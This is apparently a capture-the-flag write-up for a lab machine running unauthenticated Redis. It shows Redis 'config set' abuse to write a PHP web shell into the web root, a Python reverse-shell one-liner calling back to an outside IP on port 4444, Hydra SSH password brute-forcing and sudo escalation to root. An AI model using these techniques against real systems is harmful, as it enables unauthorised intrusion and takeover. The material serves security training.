## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!
```
## IP-Address
```IP
10.48.180.203
```
## Enumeratioon
- Network Scan
```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b7:4c:95:0f:6f:15:05:a5:1f:bb:2a:0c:72:ad:81:b3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCiVgHlDf++BdldcMKP34GEy1mK3Vo2i0jsZS5wTl3fffTNymRe/hzo7xQRimxfgeqyj+MGEFtdR/to9tXxcp6f+AOZzj/yLKoPOvALv/3dK+4HlpFwDMcJzdyWXamDJ4iKSuhvVjiMLcxHJ+rgWL2VyTaJ78h9fz7SrmuY9zJfL8jP16Dj08+QzOZkMYwzC+iN2PD+KS39OSvm+whrrcETd0KGF3xnmBw0gFnxWjMnSmSMDNHFRQZVEVlMSxzELiuAhej1LnX+1E39gStlQTmERzvnF+9CQ4yGo0Iqy9KB0yJv6EwnF3SdnC13VmmxwX6Iwr3xLGQT4TuK2ogCrtLQmtqYubBWbWq4luv/8NVTzTUmeSil3pS8WQdReaIufMXqOQ5/8R9P8kwjJb9NjWdHZQ3RCDuRfXcR62JwjdD3TurvSbOlyDwBQa1v/xnLaCdMamM8hVpKNTbePlGsbq6NhA2QpVrfbiv+x4sxTvtPtLYopJpmVTcqk+4QwYDi/Hk=
|   256 a6:f0:03:76:c6:91:f0:2a:8a:9f:b6:c6:cb:4a:52:41 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEBAKZYwzn0A955fRa6k3bF8Nn7T59IBmrRKAwrCjUOCZ8GFkeURBPgRhY3BjvhgpEitizkwJE2whqwgDCfZRw0=
|   256 5e:f4:73:ed:61:1b:6a:d4:c1:59:86:fd:dc:1b:10:f8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMj2eYAxt7AMUGo+nxAdi9Xg0UiTh/1QZ8OU2qm4/GLP
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
6379/tcp open  redis   syn-ack ttl 62 Redis key-value store 6.0.7
```
- Database `redis` & Version `6.0.7`
- Port 80 `Apache` Default Page
- `Redis` is most likely similar with `FTP` 
```bash
$ redis-cli -h 10.49.144.225
10.48.180.203:6379> config get dir
1) "dir"
2) "/"
10.48.180.203:6379> config set dir /root/.ssh
(error) ERR Changing directory: Permission denied
10.48.180.203:6379> config set dir /home/
OK
10.48.180.203:6379> config get dir
3) "dir"
4) "/home"
10.48.180.203:6379> config set dir /var/www/html
OK
10.48.180.203:6379> config set dbfilename shell.php
OK
10.48.180.203:6379> set x "<php>code</php>"
OK
10.48.180.203:6379> save
OK
10.48.180.203:6379>
```
- Created a backdoor `cmd` inside the web app running on Port 80
##### Browse 
- Navigate - `http://10.48.180.203/shell.php?cmd=id`
- Output - `REDIS0009� redis-ver6.0.7� redis-bits�@�ctime���i�used-mem°2 �aof-preamble���xuid=33(www-data) gid=33(www-data) groups=33(www-data) �Ju��\Q��`
```payload
normal - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.157.252",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

url encode - python%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.157.252%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)'
```
- Got the shell
```bash
$ cd /home/
cd /home/
$ ls
ls
ubuntu	vianka
$ cd vianka
cd vianka
$ ls
ls
redis-stable  user.txt
$ cat user.txt
cat user.txt
[flag omitted]
```
- Got the Flag
```Flag
[flag omitted]
```
#### Privilege Escalation
```bash
www-data@ip-10-48-180-203:/home/vianka$ uname -a
Linux ip-10-48-180-203 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
www-data@ip-10-48-180-203:/home/vianka$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ip-10-48-180-203:/home/vianka$ whoami
www-data
www-data@ip-10-48-180-203:/home/vianka$
```
#### User Escalation
```bash
www-data@ip-10-49-144-225:/home/vianka/redis-stable$ ls -la
total 300
drwxrwxr-x  7 vianka vianka  4096 Sep  2  2020 .
drwxr-xr-x  5 vianka vianka  4096 Sep  2  2020 ..
drwxrwxr-x  3 vianka vianka  4096 Aug 31  2020 .github
-rw-rw-r--  1 vianka vianka   462 Aug 31  2020 .gitignore
-rw-rw-r--  1 vianka vianka 91880 Aug 31  2020 00-RELEASENOTES
-rw-rw-r--  1 vianka vianka    51 Aug 31  2020 BUGS
-rw-rw-r--  1 vianka vianka  2381 Aug 31  2020 CONTRIBUTING
-rw-rw-r--  1 vianka vianka  1487 Aug 31  2020 COPYING
-rw-rw-r--  1 vianka vianka    11 Aug 31  2020 INSTALL
-rw-rw-r--  1 vianka vianka  6888 Aug 31  2020 MANIFESTO
-rw-rw-r--  1 vianka vianka   151 Aug 31  2020 Makefile
-rw-rw-r--  1 vianka vianka 21010 Aug 31  2020 README.md
-rw-rw-r--  1 vianka vianka  3055 Aug 31  2020 TLS.md
drwxrwxr-x  6 vianka vianka  4096 Sep  2  2020 deps
-rw-rw-r--  1 vianka vianka 84643 Sep  2  2020 redis.conf
-rwxrwxr-x  1 vianka vianka   275 Aug 31  2020 runtest
-rwxrwxr-x  1 vianka vianka   280 Aug 31  2020 runtest-cluster
-rwxrwxr-x  1 vianka vianka   721 Aug 31  2020 runtest-moduleapi
-rwxrwxr-x  1 vianka vianka   281 Aug 31  2020 runtest-sentinel
-rw-rw-r--  1 vianka vianka 10743 Aug 31  2020 sentinel.conf
drwxrwxr-x  3 vianka vianka 12288 Sep  2  2020 src
drwxrwxr-x 11 vianka vianka  4096 Aug 31  2020 tests
drwxrwxr-x  9 vianka vianka  4096 Aug 31  2020 utils
www-data@ip-10-49-144-225:/home/vianka/redis-stable$
```
- Still Looking
```bash
www-data@ip-10-49-144-225:/home/vianka/redis-stable$ ls -la /tmp
total 8
drwxrwxrwt  2 root root 4096 Apr 10 12:08 .
drwxr-xr-x 22 root root 4096 Apr 10 12:08 ..

$ redis-cli -h 10.49.144.225
10.49.144.225:6379> get key *
(error) ERR wrong number of arguments for 'get' command
10.49.144.225:6379>

$ redis-cli -h 10.49.144.225
10.49.144.225:6379> get key *
(error) ERR wrong number of arguments for 'get' command
10.49.144.225:6379> keys *
1) "x"
10.49.144.225:6379>

www-data@ip-10-49-144-225:/home/vianka/redis-stable$ ps aux | grep sentinel
www-data    1231  0.0  0.0   9108   724 pts/1    S+   12:38   0:00 grep sentinel
www-data@ip-10-49-144-225:/home/vianka/redis-stable$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ip-10-49-144-225:/home/vianka/redis-stable$ find / -perm -4000 2>/dev/null
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/redis-stable$ strings /home/vianka/dump.rdb
REDIS0009
	redis-ver
6.0.7
redis-bits
ctime
used-mem
aof-preamble
www-data@ip-10-49-144-225:/home/vianka/redis-stable$
```
- Nothing got from this so brute force the password
```bash
$ hydra -l vianka -P /usr/share/wordlists/rockyou.txt ssh://10.49.144.225 -t 16 -f
[DATA] attacking ssh://10.49.144.225:22/
[STATUS] 226.00 tries/min, 226 tries in 00:01h, 14344176 to do in 1057:50h, 13 active
[STATUS] 214.33 tries/min, 643 tries in 00:03h, 14343759 to do in 1115:23h, 13 active
[22][ssh] host: 10.49.144.225   login: vianka   password: [password omitted]
[STATUS] attack finished for 10.49.144.225 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-10 16:14:12
```
- Got the Password
```Creds
login: vianka   
password: [password omitted]
```
#### SSH
```bash
$ ssh vianka@10.49.144.225
Password: [password omitted]
vianka@ip-10-49-144-225:~$ ls
redis-stable  user.txt
vianka@ip-10-49-144-225:~$ sudo -l
[sudo] password for vianka:
Matching Defaults entries for vianka on ip-10-49-144-225:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ip-10-49-144-225:
    (ALL : ALL) ALL
vianka@ip-10-49-144-225:~$ sudo ls /root/root.txt
/root/root.txt
vianka@ip-10-49-144-225:~$ sudo su
root@ip-10-49-144-225:/home/vianka# lcd

Command 'lcd' not found, but there are 16 similar ones.

root@ip-10-49-144-225:/home/vianka# cd
root@ip-10-49-144-225:~# cat root.txt
[flag omitted]
```
- Got The Root Access & Flag
```Flags
User - [flag omitted]
Root - [flag omitted]
```

# END